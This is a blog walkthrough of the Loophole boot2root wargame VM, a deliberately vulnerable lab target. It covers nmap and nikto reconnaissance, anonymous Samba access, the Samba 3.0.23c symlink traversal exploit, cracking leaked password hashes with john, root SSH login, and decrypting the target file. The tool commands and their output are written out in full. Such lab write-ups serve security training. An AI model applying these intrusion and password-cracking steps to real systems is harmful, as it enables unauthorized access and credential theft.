---
layout: post
title: "Loophole hacking challenge"
date: 2012-08-29 18:10:26 -0400
comments: true
categories: boot2root
alias: /2012/08/loophole-hacking-challenge.html
---

Loophole is another wargame, created by Beller0ph0n and released at the HackingDojo forums. The image itself can be downloaded from [http://vulnhub.com](http://vulnhub.com/entry/loophole_1,27/). I'm rating this one as a beginner challenge.

<!--more-->

Loophole uses a static IP address, so you'll need to configure your network accordingly. Upon bootup, it provides network details:

```
Pool starting address: 10.8.7.4
IP subnet: 10.8.7.0
Subnet mask: 255.255.255.248
```

I used a spare router and configured it to use IP address 10.8.7.1, and I configured Backtrack 5R3 with a static IP address of 10.8.7.6.

Here's the scenario for the wargame:

> We suspect that someone inside Rattus labs is working with known terrorist group. Your mission is to infiltrate into their computer network and obtain encrypted document from one of their servers. Our inside source has told us that the document is saved under the name of Private.doc.enc and is encrypted using OpenSSL encryption utility. Obtain the document and decrypt it to complete the mission.

Sounds like fun, let's get started!

To identify the IP address that Loophole is using, we use nmap's ARP scan. The subnet mask 255.255.255.248 only allows 6 hosts, so this would be quick.

```
# nmap -PR -sn 10.8.7.0/29
 
Starting Nmap 6.01 ( http://nmap.org ) at 2012-08-29 01:15 EDT
Nmap scan report for 10.8.7.2
Host is up (0.00062s latency).
MAC Address: 00:0C:29:00:D7:E7 (VMware)
Nmap scan report for 10.8.7.6
Host is up.
Nmap done: 8 IP addresses (2 hosts up) scanned in 26.64 seconds
```

nmap identifies the Loophole server as 10.8.7.2. We can identify running services using onetwopunch.sh:

```
# echo 10.8.7.2 > t.txt
 
root mugbear.maximera ~/wargames/loophole
# onetwopunch.sh t.txt all
[+] scanning 10.8.7.2 for all ports...
[+] obtaining all open TCP ports using unicornscan...
[+] unicornscan -msf 10.8.7.2:a -l udir/10.8.7.2-tcp.txt
```

![](/images/2012-08-29/01.png)

A single hyperlink is visible on the main page. Clicking on it takes us to a status page.

![](/images/2012-08-29/02.png)

From these two pages, we've identified several users:

* Developer: Mark Hog: mhog
* Sys Admin: Tom Skies: tskies
* Network Engineer: Jay Summer: jsummer

Nikto is used to further enumerate the website, and DirBuster is used to look for hidden files and directories. Nikto reports the following:

```
root mugbear.maximera /pentest/web/nikto
# ./nikto.pl -h http://10.8.7.2
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.8.7.2
+ Target Hostname:    10.8.7.2
+ Target Port:        80
+ Start Time:         2012-08-29 01:26:32 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/1.3.31 (Unix) PHP/4.4.4
+ Server leaks inodes via ETags, header found with file /, inode: 20924, size: 3001, mtime: 0x4d5e5927
+ The anti-clickjacking X-Frame-Options header is not present.
+ PHP/4.4.4 appears to be outdated (current is at least 5.3.10)
+ Apache/1.3.31 appears to be outdated (current is at least Apache/2.2.21). Apache 1.3.42 (final release) and 2.0.64 are also current.
+ OSVDB-637: Enumeration of users is possible by requesting ~username (responds with 'Forbidden' for users, 'not found' for non-existent users).
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE, POST, PUT, DELETE, CONNECT, PATCH, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ HTTP method ('Allow' Header): 'CONNECT' may allow server to proxy client requests.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (UNLOCK LOCK MKCOL COPY PROPPATCH PROPFIND listed as allowed)
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ Retrieved x-powered-by header: PHP/4.4.4
+ OSVDB-3092: /info/: This might be interesting...
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3268: /icons/: Directory indexing found.
+ Uncommon header 'tcn' found, with contents: choice
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ 6497 items checked: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2012-08-29 01:27:14 (GMT-4) (42 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Nikto reports that it's possible to enumerate usernames by using ~username in the URL. We test this with the usernames we've found, and the following usernames return a Forbidden error: mhog, tskies, and jsummer. This indicates that those particular user accounts exist on the server. Additionally, nikto identifes info.php which provides more information about the server, such as the kernel version:

![](/images/2012-08-29/03.png)

Looking at DirBuster, not much had been found:

![](/images/2012-08-29/04.png)

We decide to keep it running in the background and examine the results of onetwopunch.sh:

```
Host: 10.8.7.2 () 
22 open tcp  ssh  OpenSSH 4.4 (protocol 1.99) 
80 open tcp  http  Apache httpd 1.3.31 ((Unix) PHP|4.4.4) 
113 open tcp  ident?   
139 open tcp  netbios-ssn  Samba smbd 3.X (workgroup: WORKGROUP) 
445 open tcp  netbios-ssn  Samba smbd 3.X (workgroup: WORKGROUP)
 
Host: 10.8.7.2 () 
137 open udp  netbios-ns
```

Samba is running on the server, so we decide to probe that and see if we can get any useful information out of it.

```
root mugbear.maximera /pentest/web/nikto
# smbclient -L 10.8.7.2 -U "" -N
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
 
 Sharename       Type      Comment
 ---------       ----      -------
 homes           Disk      Home directories
 tmp             Disk      Temporary file space
 IPC$            IPC       IPC Service (Samba server by Rattus labs)
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
 
 Server               Comment
 ---------            -------
 LOOPHOLE             Samba server by Rattus labs
 
 Workgroup            Master
 ---------            -------
 WORKGROUP            LOOPHOLE
```

Two directories, homes, and tmp, were found. We attempt to access both directories, but are only successful in accessing tmp:

```
root mugbear.maximera /pentest/web/nikto
# smbclient -I 10.8.7.2 "//LOOPHOLE/home" -U "" -N
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
 
root mugbear.maximera /pentest/web/nikto
# smbclient -I 10.8.7.2 "//LOOPHOLE/tmp" -U "" -N
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
smb: \> dir
  .                                   D        0  Tue Aug 28 18:41:03 2012
  ..                                  D        0  Tue Aug 28 20:40:02 2012
  session_mm_apache0.sem                       0  Tue Aug 28 18:41:03 2012
  .X11-unix                          DH        0  Tue Aug 28 18:40:19 2012
  .ICE-unix                          DH        0  Tue Aug 28 18:40:19 2012
 
  38631 blocks of size 16384. 33427 blocks available
smb: \>
```

It turns out that the tmp directory is world writable. We test this by uploading a file on the server:

```
root mugbear.maximera ~/wargames/loophole
# echo hello > test.txt
 
root mugbear.maximera ~/wargames/loophole
# smbclient -I 10.8.7.2 "//LOOPHOLE/tmp" -U "" -N
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
smb: \> put test.txt
putting file test.txt as \test.txt (1.0 kb/s) (average 1.0 kb/s)
smb: \> dir
  .                                   D        0  Tue Aug 28 19:39:53 2012
  ..                                  D        0  Tue Aug 28 20:40:02 2012
  test.txt                            A        6  Tue Aug 28 19:39:53 2012
  session_mm_apache0.sem                       0  Tue Aug 28 18:41:03 2012
  .X11-unix                          DH        0  Tue Aug 28 18:40:19 2012
  .ICE-unix                          DH        0  Tue Aug 28 18:40:19 2012
 
  38631 blocks of size 16384. 32863 blocks available
smb: \>
```

Doing a bit of Googling, we discover that Samba 3.0.23c is vulnerable to a symlink attack which will allow us to view the contents of the server's root directory. Metasploit's samba_symlink_traversal module was used to exploit this vulnerability:

![](/images/2012-08-29/05.png)

Metasploit successfully creates the symlink. We can verify this with smbclient.

```
smb: \> dir
  .                                   D        0  Tue Aug 28 19:52:56 2012
  ..                                  D        0  Tue Aug 28 20:40:02 2012
  rootfs                              D        0  Tue Aug 28 20:40:02 2012
  test.txt                            A        6  Tue Aug 28 19:39:53 2012
  session_mm_apache0.sem                       0  Tue Aug 28 18:41:03 2012
  .X11-unix                          DH        0  Tue Aug 28 18:40:19 2012
  .ICE-unix                          DH        0  Tue Aug 28 18:40:19 2012
 
  38631 blocks of size 16384. 30700 blocks available
smb: \> 
```

If we go into the rootfs directory and do a listing, we see the contents of the server's root directory:

```
smb: \> cd rootfs
smb: \rootfs\> ls
  .                                   D        0  Tue Aug 28 20:40:02 2012
  ..                                  D        0  Tue Aug 28 20:40:02 2012
  var                                 D        0  Thu Sep 28 17:17:18 2006
  tmp                                 D        0  Tue Aug 28 19:52:56 2012
  dev                                 D        0  Tue Aug 28 18:41:06 2012
  sys                                 D        0  Tue Aug 28 20:39:38 2012
  proc                               DR        0  Tue Aug 28 20:39:38 2012
  boot                                D        0  Mon Feb 21 06:29:26 2011
  mnt                                 D        0  Tue Aug 28 20:40:02 2012
  etc                                 D        0  Tue Aug 28 18:41:05 2012
  usr                                 D        0  Fri Feb 18 03:10:16 2011
  srv                                 D        0  Sat Apr  7 19:30:06 2007
  sbin                                D        0  Mon Feb 14 05:35:48 2011
  root                                D        0  Mon Feb 21 06:25:52 2011
  opt                                 D        0  Sun Jun 10 02:23:35 2007
  lib                                 D        0  Fri Feb 18 02:39:02 2011
  home                                D        0  Mon Feb 14 06:00:31 2011
  bin                                 D        0  Mon Apr 30 00:35:12 2007
 
  38631 blocks of size 16384. 30623 blocks available
smb: \rootfs\>
```

We have one foot in the server, now we can do some more enumerating and see what files and directories exist. The /rootfs/home directory shows only three users:

```
smb: \rootfs\> cd home
smb: \rootfs\home\> ls
  .                                   D        0  Mon Feb 14 06:00:31 2011
  ..                                  D        0  Tue Aug 28 20:40:02 2012
  jsummer                             D        0  Mon Feb 21 06:25:30 2011
  mhog                                D        0  Mon Feb 21 06:15:57 2011
  tskies                              D        0  Mon Feb 21 06:20:55 2011
 
  38631 blocks of size 16384. 30439 blocks available
smb: \rootfs\home\> 
```

We are unsuccessful in accessing the contents of the directories due to lack of permissions.

We find an interesting file in rootfs/var/www called garbage.

```
smb: \rootfs\var\www\htdocs\> ls
  .                                   D        0  Fri Feb 18 06:41:43 2011
  ..                                  D        0  Tue Mar 20 04:58:04 2001
  Images                              D        0  Fri Feb 18 06:22:50 2011
  garbage                                    288  Fri Feb 18 06:41:14 2011
  index.html                          A     3001  Fri Feb 18 06:33:59 2011
  info.php                            A       21  Fri Feb 18 06:06:04 2011
  status.html                         A     2456  Fri Feb 18 06:28:46 2011
 
  38631 blocks of size 16384. 30088 blocks available
smb: \rootfs\var\www\htdocs\>
```

Since this file is hosted by the web server, we open it with Firefox and discover UNIX encrypted password hashes, possibly belonging to the server itself:

![](/images/2012-08-29/06.png)

We save this into a file and crack it with john. Using --single, we immediately crack mhog's password, which is mhog:

```
root mugbear.maximera ~/wargames/loophole
# /pentest/passwords/john/john --single garbage.txt 
Loaded 3 password hashes with 3 different salts (FreeBSD MD5 [128/128 SSE2 intrinsics 4x])
mhog             (mhog)
guesses: 1  time: 0:00:00:00 DONE (Wed Aug 29 02:03:43 2012)  c/s: 4545  trying: tskies1903 - tskies1900
Use the "--show" option to display all of the cracked passwords reliably
```

We then follow up using the --wordlist option and use /pentest/passwords/wordlists/rockyou.txt as our wordlist, which cracks the passwords for root and tskies:

```
root mugbear.maximera ~/wargames/loophole
# /pentest/passwords/john/john --wordlist=/pentest/passwords/wordlists/rockyou.txt garbage.txt 
Loaded 3 password hashes with 3 different salts (FreeBSD MD5 [128/128 SSE2 intrinsics 4x])
Remaining 2 password hashes with 2 different salts
nostradamus      (tskies)
albatros         (root)
guesses: 2  time: 0:00:00:23 DONE (Wed Aug 29 02:05:20 2012)  c/s: 3824  trying: aldershot - alan
Use the "--show" option to display all of the cracked passwords reliably
```

Having obtained the root password, we are able to successfully login to the server:

```
root mugbear.maximera ~/wargames/loophole
# ssh root@10.8.7.2
The authenticity of host '10.8.7.2 (10.8.7.2)' can't be established.
RSA key fingerprint is 78:14:ca:10:4d:e9:57:d0:52:a5:99:75:02:e7:30:33.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.8.7.2' (RSA) to the list of known hosts.
 
 
 
 
           ===========================================================
                             WELCOME TO RATTUS LABS
           ===========================================================
 
                You've been connected to loophole.rattus.lab 
 
              To access the system you must use valid credentials.
 
           ===========================================================
 
 
 
 
root@10.8.7.2's password: 
Last login: Wed Feb 16 11:20:48 2011
 
 
 
 
 
 
   ===========================================================
                     WELCOME TO RATTUS LABS
   ===========================================================
 
      I'm here to serve you MASTER ... 
 
   ===========================================================
 
 
[root@loophole]$  id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),17(audio),18(video),19(cdrom),26(tape),83(plugdev)
[root@loophole]$  
```

Now that we have complete access to the server, we can start looking around the home directories. The encrypted file Private.doc.enc was found in /home/tskies/. This user also had a .bash_history which we opened to reveal the command used to encrypt the document:

```
[root@loophole]$  cat .bash_history 
openssl enc -aes-256-cbc -e -in Private.doc -out Private.doc.enc -pass pass:nostradamus
startx
nano .bash_history 
exit
```

Having obtained the cipher and password, we can easily decrypt the file:

```
[root@loophole]$  openssl enc -aes-256-cbc -d -in Private.doc.enc -out Private.doc -pass pass:nostradamus
[root@loophole]$  ls -l Private.doc
-rw-r--r-- 1 root root 390144 2012-08-29 02:29 Private.doc
```

We transfer the file back to our machine using scp so we can view it later. A file /home/tskies/temp/junk was also found, containing another UNIX password hash. Cracking this with john revealed the same password for user tskies as we had cracked earlier.

Nothing else of interest was found on the server, so finally we open up the Private.doc to complete the mission:

![](/images/2012-08-29/07.png)

This was an easy challenge, and if I had let DirBuster run longer, it would have probably found the garbage file on its own, and I wouldn't have had to discover it by exploiting Samba. In any case, a good beginner's challenge. 
